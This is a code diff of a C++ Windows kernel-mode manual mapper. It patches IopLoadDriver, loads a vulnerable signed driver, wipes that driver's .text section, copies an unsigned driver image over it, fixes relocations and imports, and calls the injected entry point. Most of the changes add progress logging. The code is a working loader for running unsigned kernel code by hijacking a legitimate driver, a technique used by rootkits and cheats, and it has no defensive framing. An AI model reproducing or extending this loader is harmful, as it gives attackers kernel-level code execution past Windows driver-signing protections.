@@ -26,24 +26,29 @@ modules::section_data text_section = modules::section_data();
 
 NTSTATUS map_new_driver()
 {
-	auto local_driver_base = reinterpret_cast<std::uint64_t>(imports::ex_allocate_pool(NonPagedPool, sizeof(raw_driver_bytes)));
+	printf("Mapping driver...\n");
+
+	const auto dos_headers = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_driver_bytes);
+	const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(raw_driver_bytes + dos_headers->e_lfanew);
+
+	const auto driver_size = nt_headers->OptionalHeader.SizeOfImage;
+	if (driver_size > text_section.size)
+	{
+		printf("\rDriver size too big.\n");
+		return STATUS_UNSUCCESSFUL;
+	}
+	printf("\rDriver size: 0x%lx\n", driver_size);
+
+	auto local_driver_base = reinterpret_cast<std::uint64_t>(imports::ex_allocate_pool(NonPagedPool, driver_size));
 	if (!local_driver_base)
 	{
-		printf("Failed to allocate local driver base.\n");
+		printf("\rFailed to allocate local driver base.\n");
 		return STATUS_UNSUCCESSFUL;
 	}
-	
+	printf("\rLocal driver base: 0x%llx\n", local_driver_base);
+
 	crt::kmemcpy(reinterpret_cast<void*>(local_driver_base), raw_driver_bytes, sizeof(raw_driver_bytes));
 	
-	const auto dos_headers = reinterpret_cast<PIMAGE_DOS_HEADER>(local_driver_base);
-	const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(local_driver_base + dos_headers->e_lfanew);
-	
-	if (nt_headers->OptionalHeader.SizeOfImage > text_section.size)
-	{
-		printf("Driver size too big.\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-
 	const auto current_image_section = IMAGE_FIRST_SECTION(nt_headers);
 
 	for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) 
@@ -59,18 +64,23 @@ NTSTATUS map_new_driver()
 	}
 
 	mapper::resolve_relocs(local_driver_base, nt_headers);
-	mapper::resolve_imports(local_driver_base, nt_headers);
-	mapper::unload_discardable_sections(local_driver_base, nt_headers);
-	
-	ctx::write_protected_address(reinterpret_cast<void*>(text_section.address), (void*)local_driver_base, nt_headers->OptionalHeader.SizeOfImage, true);
-	
-	//ctx::randomize_address_range(local_driver_base, sizeof(raw_driver_bytes));
-	//crt::kmemset(reinterpret_cast<void*>(local_driver_base), 0, nt_headers->OptionalHeader.SizeOfImage);
+	printf("\rResolved relocations.\n");
 
+	mapper::resolve_imports(local_driver_base, nt_headers);
+	printf("\rResolved imports.\n");
+
+	mapper::unload_discardable_sections(local_driver_base, nt_headers);
+	printf("\rUnloaded discardable sections.\n");
+
+	ctx::write_protected_address(reinterpret_cast<void*>(text_section.address), (void*)local_driver_base, driver_size, true);
+	printf("\rPatched driver to target.\n");
+
+	crt::kmemset(reinterpret_cast<void*>(local_driver_base), 0xcc, driver_size);
 	imports::ex_free_pool_with_tag(reinterpret_cast<void*>(local_driver_base), 0);
 	
-	const auto entry_address = reinterpret_cast<void*>(text_section.address + nt_headers->OptionalHeader.AddressOfEntryPoint);
+	printf("\rCalling entry...\n");
 
+	const auto entry_address = reinterpret_cast<void*>(text_section.address + nt_headers->OptionalHeader.AddressOfEntryPoint);
 	NTSTATUS(*entry_point)(void* p1, void* p2) = (NTSTATUS(*)(void*, void*))(entry_address);
 	
 	return entry_point(0, 0);
@@ -102,10 +112,9 @@ NTSTATUS manual_mapped_entry(void* a1, void* a2)
 	}
 	printf("Original bytes buffer: 0x%llx\n", reinterpret_cast<std::uint64_t>(original_bytes));
 
-	// Patch IopLoadDriver to not call driver entry
 	ctx::nop_address_range(calldrv_address, PATCH_LENTH, original_bytes);
+	printf("Patched IopLoadDriver.\n");
 
-	// Load driver to exploit
 	if (!modules::load_vurn_driver(skCrypt(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv")))
 	{
 		printf("Couldnt load driver.\n");
@@ -115,7 +124,6 @@ NTSTATUS manual_mapped_entry(void* a1, void* a2)
 	}
 	printf("Loaded vurnable driver.\n");
 	
-	// Restore bytes
 	ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
 	imports::ex_free_pool_with_tag(original_bytes, 0);
 
@@ -135,11 +143,19 @@ NTSTATUS manual_mapped_entry(void* a1, void* a2)
 		printf("Text section is invalid.\n");
 		return STATUS_UNSUCCESSFUL;
 	}
-	printf("Text section size: 0x%llx\n", text_section.size);
-	printf("Text section base: 0x%llx\n", text_section.address);
 
-	// Zero .text section
+	//printf("Text section size: 0x%llx\n", text_section.size);
+	//printf("Text section base: 0x%llx\n", text_section.address);
+
 	ctx::zero_address_range(text_section.address, text_section.size);
 
-	return map_new_driver();
+	const auto status = map_new_driver();
+	if (!NT_SUCCESS(status))
+	{
+		return status;
+	}
+
+	printf("Success!\n");
+
+	return STATUS_SUCCESS;
 }
